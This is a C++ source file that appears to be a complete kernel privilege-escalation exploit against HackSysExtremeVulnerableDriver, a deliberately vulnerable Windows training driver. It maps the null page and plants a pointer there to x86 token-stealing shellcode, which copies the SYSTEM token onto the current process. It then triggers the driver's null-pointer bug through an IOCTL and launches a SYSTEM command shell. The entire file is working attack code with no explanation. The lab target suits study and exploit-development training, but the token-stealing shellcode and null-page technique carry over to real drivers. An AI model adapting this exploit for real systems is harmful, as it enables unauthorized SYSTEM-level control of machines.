#include <iostream>
#include <Windows.h>
using namespace std;

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IO_CODE 0x22202b

typedef NTSTATUS(WINAPI* _NtAllocateVirtualMemory)(
	HANDLE    ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect
	);

HANDLE grab_handle() {
	HANDLE hFile = CreateFile(DEVICE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		cout << "[-] Failed to open handle to device.\n";
		exit(-1);
	}

	cout << "[+] Opened handle to device with value " << hex << hFile << endl;

	return hFile;
}

void send_payload(HANDLE hFile) {
	char bytes[] = "\x41\x41\x41\x41";
	DWORD bytesRet = 0;

	cout << "[+] Beginning interaction with the driver." << endl;
	DeviceIoControl(hFile, IO_CODE,
		bytes, sizeof(bytes),
		NULL, 0,
		&bytesRet, NULL);
}

void allocate_shellcode() {
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)
		GetProcAddress(GetModuleHandleA("ntdll.dll"),
			"NtAllocateVirtualMemory");
	if (NtAllocateVirtualMemory == NULL) {
		cout << "[-] Failed to establish base address" << endl;
		exit(-1);
	}

	INT64 Base = 0x1;
	size_t size = 0x1000;
	NtAllocateVirtualMemory(GetCurrentProcess(),
		(PVOID*)& Base,
		0,
		(PSIZE_T)& size,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	char shellcode[] = (
		"\x60" // PUSHAD
		"\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
		"\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
								   // #---[Copy System PID token]
		"\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET |
		"\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx |
		"\x75\xED" // jnz                                          -> |
		"\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx
								   //#---[Recover]
		"\x61" // popad
		"\x31\xC0" // Set NTSTATUS->STATUS_SUCCESS so calling function thinks we exited successfully
		"\xC3"
		);

	LPVOID address = VirtualAlloc(NULL,
		sizeof(shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (address == NULL) {
		cout << "Failed to allocate memory for storing shellcode" << endl;
		exit(-1);
	}

	RtlMoveMemory(address, shellcode, sizeof(shellcode));

	memset((void*)0, '\x00', 0x1000);
	memcpy((void*)0x4, &address, 0x4);
}

void spawn_shell() {
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	CreateProcess("C:\\Windows\\System32\\cmd.exe",
		NULL, NULL, NULL,
		FALSE,
		CREATE_NEW_CONSOLE,
		NULL, NULL,
		&si,
		&pi);
}

int main(void) {
	HANDLE hFile = grab_handle();

	allocate_shellcode();

	send_payload(hFile);

	spawn_shell();

	return 0;
}